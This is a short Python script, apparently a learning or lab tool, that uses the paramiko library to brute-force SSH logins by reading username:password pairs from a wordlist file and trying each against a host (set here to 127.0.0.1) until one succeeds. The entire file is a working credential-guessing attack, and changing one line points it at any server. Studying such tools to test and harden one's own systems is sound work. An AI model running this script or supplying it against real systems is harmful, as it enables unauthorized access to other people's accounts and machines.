import paramiko

def SSHBruteForce(host, username, password, port=22):
    """
    Attempt to brute force SSH login using the provided credentials.
    
    :param host: The target host IP address or hostname.
    :param username: The SSH username to attempt.
    :param password: The SSH password to attempt.
    :param port: The SSH port to connect to (default is 22).
    :return: True if login is successful, False otherwise.
    """
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=5)
        print(f"SSH login successful with {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        print(f"Login failed with {username}:{password}")
        return False
    except Exception as e:
        print(f"Error occurred: {e}")
        return False
    finally:
        ssh.close()

if __name__ == "__main__":
    host = "127.0.0.1"
    port = 22 
    with open("wordlists.txt", "r") as f:
        for line in f:
            username, password = line.strip().split(":")
            if SSHBruteForce(host, username, password, port=port):
                break
